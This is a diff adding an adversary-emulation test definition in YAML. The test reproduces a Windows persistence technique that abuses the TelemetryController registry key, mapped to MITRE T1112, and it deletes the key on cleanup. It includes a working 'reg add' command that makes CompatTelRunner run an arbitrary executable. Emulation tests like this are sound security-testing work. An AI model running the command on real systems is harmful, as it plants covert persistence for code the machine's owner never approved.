@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Abusing Windows TelemetryController Registry Key for Persistence
+description: "The Windows Compatibility Telemetry system makes use of the CompatTelRunner.exe binary to run a variety of telemetry tasks. It relies on the registry for instructions on which commands to run. \nIt will run any arbitrary command without restriction of location or type. Blog :https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence\n"
+args:
+    - name: new_key
+      type: string
+      default: NewKey
+    - name: new_executable
+      type: string
+      default: C:\Windows\System32\notepad.exe
+uuid: 4469192c-2d2d-4a3a-9758-1f31d937a92b
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1112: Modify Registry'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: abusing-windows-telemetrycontroller-registry-key-for-persistence
+      inline: |
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\{{.Args.new_key}}" /t REG_SZ /v Command /d {{.Args.new_executable}} /f
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\{{.Args.new_key}}" /f
+        executor: command_prompt
